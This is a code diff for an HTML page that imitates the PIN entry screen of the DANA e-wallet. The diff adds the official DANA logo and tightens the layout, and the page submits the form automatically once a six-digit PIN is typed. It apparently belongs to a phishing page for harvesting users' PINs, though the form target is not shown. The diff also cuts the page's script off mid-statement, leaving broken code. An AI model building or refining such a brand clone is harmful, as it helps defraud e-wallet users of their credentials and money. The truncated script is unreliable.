@@ -22,20 +22,25 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
-      padding: 16px;
-      font-size: 18px;
-      font-weight: bold;
+      padding: 10px 16px;
     }
 
     .header .back {
-      font-size: 24px;
-      margin-right: 10px;
+      font-size: 22px;
       cursor: pointer;
     }
 
+    .header .logo {
+      height: 26px;
+    }
+
+    .header .spacer {
+      width: 22px;
+    }
+
     .title {
-      margin-top: 40px;
-      font-size: 16px;
+      margin-top: 24px;
+      font-size: 15px;
     }
 
     .title strong {
@@ -45,19 +50,19 @@
     .pin-boxes {
       display: flex;
       justify-content: center;
-      gap: 12px;
-      margin: 30px 0 20px;
+      gap: 10px;
+      margin: 24px 0 16px;
     }
 
     .pin-box {
-      width: 48px;
-      height: 48px;
-      border-radius: 10px;
+      width: 42px;
+      height: 42px;
+      border-radius: 8px;
       background-color: white;
       color: black;
-      font-size: 24px;
+      font-size: 20px;
       text-align: center;
-      line-height: 48px;
+      line-height: 42px;
     }
 
     input[type="password"] {
@@ -67,18 +72,19 @@
     }
 
     .show-btn {
-      padding: 8px 20px;
+      padding: 6px 18px;
       border: 1.5px solid white;
       background: transparent;
       color: white;
       font-weight: bold;
+      font-size: 13px;
       border-radius: 20px;
       margin-bottom: 20px;
       cursor: pointer;
     }
 
     .links {
-      font-size: 14px;
+      font-size: 13px;
       margin-top: 10px;
     }
 
@@ -93,8 +99,8 @@
 
   <div class="header">
     <div class="back">&larr;</div>
-    <div>Masuk</div>
-    <div style="width: 24px;"></div> <!-- Spacer -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/Dana_logo.svg" alt="Logo DANA" class="logo">
+    <div class="spacer"></div>
   </div>
 
   <div class="title">Masukkan <strong>PIN DANA</strong></div>
@@ -123,37 +129,4 @@
   <script>
     const input = document.getElementById("pinInput");
     const boxes = [
-      document.getElementById("dot1"),
-      document.getElementById("dot2"),
-      document.getElementById("dot3"),
-      document.getElementById("dot4"),
-      document.getElementById("dot5"),
-      document.getElementById("dot6"),
-    ];
-
-    input.addEventListener("input", () => {
-      const val = input.value;
-      boxes.forEach((box, i) => {
-        box.textContent = val[i] ? "•" : "";
-      });
-
-      if (val.length === 6) {
-        input.form.submit();
-      }
-    });
-
-    function togglePin() {
-      boxes.forEach((box, i) => {
-        const val = input.value[i];
-        if (val) {
-          box.textContent = box.textContent === "•" ? val : "•";
-        }
-      });
-    }
-
-    window.onload = () => {
-      input.focus();
-    };
-  </script>
-</body>
-</html>
+      document.getElementById("
